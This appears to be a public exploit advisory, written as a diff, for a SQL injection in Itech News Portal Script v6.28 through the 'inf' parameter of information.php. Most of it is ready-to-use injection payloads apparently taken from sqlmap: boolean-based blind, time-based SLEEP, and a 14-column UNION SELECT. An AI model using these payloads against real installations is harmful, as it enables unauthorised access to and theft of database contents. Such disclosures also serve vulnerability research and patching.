@@ -1,0 +1,34 @@
+Exploit Title: Itech News Portal Script v6.28 – SQL Injection
+Date: 30.01.2017
+Vendor Homepage: http://itechscripts.com/
+Software Link: http://itechscripts.com/news-portal-script/
+Exploit Author: Kaan KAMIS
+Contact: iletisim[at]k2an[dot]com
+Website: http://k2an.com
+Category: Web Application Exploits
+
+Overview
+
+News Portal Script v6.28 is a CMS Software developed as a news broadcasting portal. This product is considered as the best in this category.
+
+Type of vulnerability:
+
+An SQL Injection vulnerability in News Portal Script v6.28 allows attackers to read
+arbitrary data from the database.
+
+Vulnerability:
+
+http://localhost/news-portal-script/information.php?inf=22[payload]
+
+Parameter: inf (GET)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: inf=22 AND 3993=3993
+
+    Type: AND/OR time-based blind
+    Title: MySQL >= 5.0.12 OR time-based blind
+    Payload: inf=22 OR SLEEP(5)
+
+    Type: UNION query
+    Title: Generic UNION query (NULL) - 14 columns
+    Payload: inf=-1695 UNION ALL SELECT CONCAT(0x716a787171,0x7356527144546c6e6b47714b49415759595952764c734a657165476f4d496e534e565668666f786f,0x7178787671),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- trhS
